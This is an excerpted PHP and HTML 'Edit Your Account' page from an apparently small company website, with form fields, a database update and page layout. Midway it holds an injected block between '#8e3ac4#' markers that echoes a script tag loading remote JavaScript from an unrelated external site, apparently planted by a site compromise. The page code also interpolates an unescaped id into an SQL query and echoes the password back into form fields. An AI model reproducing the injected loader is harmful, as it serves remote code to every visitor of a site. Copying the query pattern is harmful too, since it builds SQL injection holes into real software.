...
// Email
	...
	elseif(!(eregi(email_expression,$email)))
	{
		...
		$query ="SELECT count(*) as member_count FROM customer WHERE id != $id and email = '".mysql_escape_string($email)."' ";
...
if (isset($_POST["register"]) AND ($submit_status == TRUE))
{
	...
	$update_info["date_lastlogin"] = date('Y-m-d');
	$update_info["date_register"] = date('Y-m-d');
	
	$update_info["status"] = 2;
	
	$where["id"] = $id;

	$cls -> db_update('customer',$update_info,$where);
...
*/	
	////////////
	header('Location: my_account.php?edit=1');
	exit(0);
...
<tr>
	...
	<td  valign="top" style="width:252px;padding:10px; padding-top:57px; padding-left:50px;background-image:url(../../images/loop1.gif);background-repeat: repeat-x;">
		<div align="left" class="top">
			...
			<div style=" padding-bottom:7px;"><img align="absmiddle" src="../../images/bullet_1.gif" /> <a href="">OUR SERVICE</a><br /></div>
...
#8e3ac4#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16224511\"></script>";
echo $srwv;
}
#/8e3ac4#
?>
	...
	<div align="center">
		...
		<br />
		<div class="bottom" style="padding-bottom:10px; margin-top:10px;"><a href="my_account.php">My Account</a></div>
	...
	<td valign="top" colspan="2" style="background-color: #FFFFFF; border:2px solid #cccccc; ">
		...
		<b><!-- InstanceBeginEditable name="header" -->Edit Your Account <br />
		<!-- InstanceEndEditable --></b>
		<hr style="color:#d7d7d7; margin:2px; margin-bottom:10px; margin-top:10px;" />
		<!-- InstanceBeginEditable name="content" -->
		<div align="center">
		<div align="left"><a href="my_account.php">My Account Home Page</a></div>
<br />

				<div align="center" style="color:#003399; font-size:14px; font-weight:bolder; padding-right:20px; padding-bottom:5px; font-family:Arial"><u>Edit your account !</u></div>
...
{     
	...
	obj1.style.display="block" ;	                       
					...
					<tr>
						...
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="password" type="password" id="password" style="width:200px" value="<? print @$password; ?>">						</td>
					</tr>
					<tr>
						<td class="div_2" align="right"><span class="star_1">*</span>Confirm Password :</td>
						<td width="5"></td>
						<td align="left" style="padding-top:5px;">
							<input name="confirm_password" type="password" id="confirm_password" style="width:200px" value="<? print @$password; ?>">						</td>
					</tr>
					...
					<tr>
						<td align="center" colspan="3"><br><input name="register" type="submit" id="register" value="   Edit   ">
						<br><br></td>
					</tr>
					</form>
					</table>
...
<td height="72" colspan="3" style="background-image:url(../../images/footer_1.gif); background-repeat:no-repeat">
	<div align="center" style=" padding-top:20px;font-family:Verdana; font-size:10px; color: #333333;">
		Copyright 2010 &copy;Egypt Machniery All Right Reserved to <a target="_blank" href="../../Eracore.net">Eracore.net</a>
	</div>
</td>
</tr>
</table>	
